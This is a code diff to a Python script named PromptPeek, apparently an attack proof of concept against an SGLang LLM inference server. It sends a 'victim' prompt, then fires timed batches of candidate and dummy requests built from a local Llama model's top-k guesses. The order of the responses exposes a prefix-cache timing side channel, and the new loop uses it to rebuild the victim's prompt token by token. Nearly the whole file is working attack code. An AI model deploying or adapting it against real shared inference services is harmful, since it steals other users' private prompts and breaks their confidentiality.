@@ -17,38 +17,41 @@ DUMMIES_SIZE = 8
 MAX_TOKENS = 128
 TEMPERATURE = 0
 
+# How many post dummies until candidates are considered wrong
+POST_DUMMY_THRESHOLD = 4
+
 model = LlamaForCausalLM.from_pretrained(MODEL_NAME_OR_PATH)
 tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME_OR_PATH)
 client = httpx.AsyncClient(timeout=120)
 
 
-def gen_next_tokens(prefix: str) -> Tuple[List[str], List[str]]:
-    inputs = tokenizer(prefix, return_tensors="pt")
-    outputs = model(**inputs)
+def gen_next_tokens(prefix: List[int]) -> Tuple[List[int], List[int]]:
+    input_ids = torch.tensor([prefix])  # batch of size 1
+    attention_mask = torch.ones_like(input_ids)
+
+    outputs = model(input_ids=input_ids, attention_mask=attention_mask)
     logits = outputs.logits
 
     last_token_logits = logits[0, -1, :]
 
     topk = torch.topk(last_token_logits, k=CANDIDATES_SIZE)
     top_indices = topk.indices
-    candidates = [tokenizer.decode([token_id]) for token_id in top_indices.tolist()]
+    candidates = top_indices.tolist()
 
     bottomk = torch.topk(last_token_logits, k=DUMMIES_SIZE, largest=False)
     bottom_indices = bottomk.indices
-    dummies = [tokenizer.decode([token_id]) for token_id in bottom_indices.tolist()]
+    dummies = bottom_indices.tolist()
 
     # Top-K, Bottom-K tokens
     return (candidates, dummies)
 
 
-async def send_request(prompt: str, req_id: str):
-    # TODO: Add delay before sending request
+async def send_request(toks: List[int], req_id: str):
     delay = 0
-
     return await client.post(
         f"{SGLANG_SERVER}/generate",
         json={
-            "text": prompt,
+            "input_ids": toks,
             "rid": req_id,
             "sampling_params": {
                 "temperature": TEMPERATURE,
@@ -57,34 +60,28 @@ async def send_request(prompt: str, req_id: str):
         },
         headers={
             "PromptPeek-Request-Id": req_id,
-            "PromptPeek-Prompt": prompt,
             "PromptPeek-Delay": str(delay),
         },
     )
 
 
-async def peek_one(prefix: str):
+async def peek_one(prefix: List[int]) -> List[List[int]]:
     cand_toks, dummy_toks = gen_next_tokens(prefix)
-    # TODO: Consider whether we should use the same dummy token
-    dummy_toks = [dummy_toks[0]] * len(dummy_toks)  # Use the same dummy token
+    candidates = [prefix + [tok, dummy_toks[0]] for tok in cand_toks]
+    dummies = [prefix + [dummy_toks[0], dummy_toks[0]] for _ in dummy_toks]
 
     tasks = []
-    for i in range(DUMMIES_SIZE):
-        text = prefix + dummy_toks[i] * 2
-        id = f"pre_dummy_{i}"
-        tasks.append(asyncio.create_task(send_request(text, id)))
+    for i, pre_dummy in enumerate(dummies):
+        tasks.append(asyncio.create_task(send_request(pre_dummy, f"pre_dummy_{i}")))
     await asyncio.sleep(0.2)
 
-    for i in range(CANDIDATES_SIZE):
-        text = prefix + cand_toks[i] * 2
-        id = f"candidate_{i}"
-        tasks.append(asyncio.create_task(send_request(text, id)))
+    for i, cand in enumerate(candidates):
+        tasks.append(asyncio.create_task(send_request(cand, f"candidate_{i}")))
     await asyncio.sleep(0.2)
 
-    for i in range(DUMMIES_SIZE):
-        text = prefix + dummy_toks[i] * 2
-        id = f"post_dummy_{i}"
-        tasks.append(asyncio.create_task(send_request(text, id)))
+    for i, post_dummy in enumerate(dummies):
+        tasks.append(asyncio.create_task(send_request(post_dummy, f"post_dummy_{i}")))
+    await asyncio.sleep(0.2)
 
     response_order = []
     for task in asyncio.as_completed(tasks):
@@ -92,16 +89,25 @@ async def peek_one(prefix: str):
         body = res.json()
 
         e2e_latency = body["meta_info"]["e2e_latency"]
-        # completion = body["text"]
 
         req_id = res.request.headers["PromptPeek-Request-Id"]
-        prompt = res.request.headers["PromptPeek-Prompt"]
         # delay = res.request.headers["PromptPeek-Delay"]
 
-        response_order.append(
-            {"id": req_id, "prompt": prompt, "e2e_latency": e2e_latency}
-        )
-    return response_order
+        response_order.append({"id": req_id, "e2e_latency": e2e_latency})
+
+    n_post_dummies = 0
+    next_prefixes = []
+    for res in response_order:
+        if res["id"].startswith("post_dummy"):
+            n_post_dummies += 1
+        if n_post_dummies >= POST_DUMMY_THRESHOLD:
+            break
+        if res["id"].startswith("candidate"):
+            idx = int(res["id"].split("_")[-1])
+            next_prefix = candidates[idx][: len(prefix) + 1]
+            next_prefixes.append(next_prefix)
+
+    return next_prefixes
 
 
 async def main():
@@ -112,14 +118,18 @@ async def main():
     requests.post(SGLANG_SERVER + "/flush_cache")
 
     # Victim
-    await send_request(victim_input, "victim_0")
+    victim_toks = tokenizer.encode(victim_input)
+    await send_request(victim_toks, "victim_0")
 
-    # TODO: Do proper PromptPeek loop
-    while True:
-        response_order = await peek_one(known_prefix)
-        for res in response_order:
-            print(res["id"], res["prompt"])
-        break
+    prefixes = [tokenizer.encode(known_prefix)]
+    while len(prefixes) > 0:
+        prefix = prefixes.pop(0)
+        if len(prefix) > len(victim_toks):
+            break
+
+        print(tokenizer.decode(prefix))
+        next_prefixes = await peek_one(prefix)
+        prefixes.extend(next_prefixes)
 
 
 if __name__ == "__main__":
